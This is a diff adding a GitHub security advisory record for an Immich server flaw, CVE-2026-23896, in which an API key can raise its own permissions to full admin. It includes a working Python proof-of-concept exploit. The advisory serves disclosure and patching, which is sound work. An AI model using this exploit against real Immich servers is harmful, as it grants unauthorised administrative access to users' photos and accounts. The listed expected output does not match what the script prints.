@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-237r-x578-h5mv",
+  "repo": {
+    "cve_id": "CVE-2026-23896",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 7.2,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-269"
+    ],
+    "description": "# API Key Privilege Escalation\r\n\r\n### Summary\r\n\r\nAPI keys can escalate their own permissions by calling the update endpoint, allowing a low-privilege API key to grant itself full administrative access to the system.\r\n\r\n### Details\r\n\r\nThe `update` method in `api-key.service.ts` allows an API key to modify its own permissions without verifying the caller has authority to grant those permissions.\r\n\r\n```typescript\r\nasync update(auth: AuthDto, id: string, dto: APIKeyUpdateDto) {\r\n  // ... only checks if key exists\r\n  // BUG: No check that auth.apiKey has all permissions in dto.permissions\r\n  const key = await this.apiKeyRepository.update(...);\r\n}\r\n```\r\n\r\nThe `create` method correctly validates permissions:\r\n```typescript\r\nif (auth.apiKey && !isGranted({ requested: dto.permissions, current: auth.apiKey.permissions })) {\r\n  throw new BadRequestException('Cannot grant permissions you do not have');\r\n}\r\n```\r\n\r\nThis same check is missing in the `update` method.\r\n\r\n### PoC\r\nThe PoC assumes `immich` is running and available on port `2283` and is empty.\r\nIf that's not the case, update the ADMIN_EMAIL, ADMIN_PASSWORD variable at the top.\r\n\r\n```bash\r\n# Run exploit\r\nuv run exploit.py\r\n```\r\n\r\n```python exploit.py\r\n#!/usr/bin/env -S uv run --quiet --script\r\n# /// script\r\n# requires-python = \">=3.12\"\r\n# dependencies = [\"requests\"]\r\n# ///\r\n\"\"\"\r\nImmich API Key Privilege Escalation PoC\r\n\r\nDemonstrates that an API key with limited permissions can escalate itself\r\nto full system access by updating its own permissions.\r\n\"\"\"\r\n\r\nimport sys\r\nimport time\r\n\r\nimport requests\r\n\r\nBASE_URL = \"http://localhost:2283/api\"\r\nADMIN_EMAIL = \"admin@example.com\"\r\nADMIN_PASSWORD = \"admin123456\"\r\n\r\n\r\ndef main():\r\n    # Step 1: Seed by creating an admin\r\n    print(\"Step 1: Seed by creating an admin\")\r\n    for _ in range(30):\r\n        try:\r\n            if requests.get(f\"{BASE_URL}/server/ping\", timeout=2).status_code == 200:\r\n                break\r\n        except requests.exceptions.ConnectionError:\r\n            time.sleep(2)\r\n    else:\r\n        print(\"Server not ready\")\r\n        sys.exit(1)\r\n\r\n    r = requests.get(f\"{BASE_URL}/server/config\")\r\n    if not r.json().get(\"isInitialized\"):\r\n        requests.post(\r\n            f\"{BASE_URL}/auth/admin-sign-up\",\r\n            json={\"email\": ADMIN_EMAIL, \"password\": ADMIN_PASSWORD, \"name\": \"Admin\"},\r\n        ).raise_for_status()\r\n\r\n    r = requests.post(\r\n        f\"{BASE_URL}/auth/login\",\r\n        json={\"email\": ADMIN_EMAIL, \"password\": ADMIN_PASSWORD},\r\n    )\r\n    r.raise_for_status()\r\n    admin_token = r.json()[\"accessToken\"]\r\n    print(\"Admin created and logged in\")\r\n\r\n    # Step 2: Create a limited API key (only apiKey.read and apiKey.update)\r\n    print(\"\\nStep 2: Create a limited API key (only apiKey.read and apiKey.update)\")\r\n    r = requests.post(\r\n        f\"{BASE_URL}/api-keys\",\r\n        headers={\"Authorization\": f\"Bearer {admin_token}\"},\r\n        json={\"name\": \"Limited Key\", \"permissions\": [\"apiKey.read\", \"apiKey.update\"]},\r\n    )\r\n    r.raise_for_status()\r\n    key_id = r.json()[\"apiKey\"][\"id\"]\r\n    api_key = r.json()[\"secret\"]\r\n    print(f\"Created API key: {key_id}\")\r\n\r\n    # Step 3: Try to create an album (should fail - no album.create permission)\r\n    print(\"\\nStep 3: Try to create an album (should fail - no album.create permission)\")\r\n    r = requests.post(\r\n        f\"{BASE_URL}/albums\",\r\n        headers={\"x-api-key\": api_key},\r\n        json={\"albumName\": \"Test Album\"},\r\n    )\r\n    print(f\"Status: {r.status_code} (expected 403)\")\r\n    assert r.status_code == 403, f\"Expected 403, got {r.status_code}\"\r\n\r\n    # Step 4: Escalate permissions by updating the API key to have 'all' permissions\r\n    print(\"\\nStep 4: Escalate permissions by updating the API key to have 'all' permissions\")\r\n    r = requests.put(\r\n        f\"{BASE_URL}/api-keys/{key_id}\",\r\n        headers={\"x-api-key\": api_key},\r\n        json={\"name\": \"Escalated Key\", \"permissions\": [\"all\"]},\r\n    )\r\n    print(f\"Status: {r.status_code}\")\r\n    assert r.status_code == 200, f\"Expected 200, got {r.status_code}\"\r\n    print(f\"New permissions: {r.json()['permissions']}\")\r\n\r\n    # Step 5: Try to create an album again (should succeed now)\r\n    print(\"\\nStep 5: Try to create an album again (should succeed now)\")\r\n    r = requests.post(\r\n        f\"{BASE_URL}/albums\",\r\n        headers={\"x-api-key\": api_key},\r\n        json={\"albumName\": \"Test Album\"},\r\n    )\r\n    print(f\"Status: {r.status_code} (expected 201)\")\r\n    assert r.status_code == 201, f\"Expected 201, got {r.status_code}\"\r\n\r\n    print(\"\\nPRIVILEGE ESCALATION SUCCESSFUL\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n```\r\n\r\n\r\n\r\n**Expected Output:**\r\n\r\n```\r\nStep 4: Demonstrating LIMITED permissions\r\n  [INFO] Attempting to create an album with limited API key...\r\n  [OK] Correctly denied (status 403)\r\n\r\nStep 5: EXPLOITING the vulnerability\r\n  [OK] Permissions escalated! (status 200)\r\n\r\nStep 6: Demonstrating ESCALATED permissions\r\n  [OK] Album created (status 201)\r\n\r\n  PRIVILEGE ESCALATION SUCCESSFUL!\r\n```\r\n\r\n### Impact\r\n\r\nAny user with the ability to create an API key (even with minimal permissions) can escalate that key to have full administrative permissions. This allows complete account takeover and access to all user data and administrative functions.\r\n\r\n",
+    "ghsa_id": "GHSA-237r-x578-h5mv",
+    "html_url": "https://github.com/immich-app/immich/security/advisories/GHSA-237r-x578-h5mv",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-237r-x578-h5mv"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-23896"
+      }
+    ],
+    "published_at": "2026-01-29T14:18:37Z",
+    "references": [],
+    "severity": "high",
+    "summary": "API Key Privilege Escalation",
+    "updated_at": "2026-01-29T14:18:37Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "docker",
+          "name": "immich-server"
+        },
+        "patched_versions": ">= 2.5.0",
+        "vulnerable_version_range": "< 2.4.1"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "immich-app/immich"
+}
